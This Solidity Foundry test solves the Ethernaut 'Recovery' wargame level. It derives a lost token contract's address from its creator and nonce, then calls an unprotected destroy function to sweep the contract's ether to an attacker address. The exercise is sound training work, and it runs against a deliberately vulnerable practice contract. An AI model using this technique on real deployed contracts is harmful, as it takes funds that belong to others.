//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Recovery/RecoveryFactory.sol";

contract RecoveryTest is DSTest {
    //state variables
    Vm vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    address attacker = payable(address(0xbabe));

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testRecoveryHack() public {
        //LEVEL SETUP
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
        Recovery recoveryContract = Recovery(payable(levelAddress));

        //LEVEL ATTACK
       //get address of Simple token from recovery(check factory)
       address _simpleTokenContract = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
       SimpleToken simpleTokenContract = SimpleToken(payable(_simpleTokenContract));
       simpleTokenContract.destroy(payable(attacker));
        //LEVEL SUBMISSION
        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(challengeCompleted);
    }
}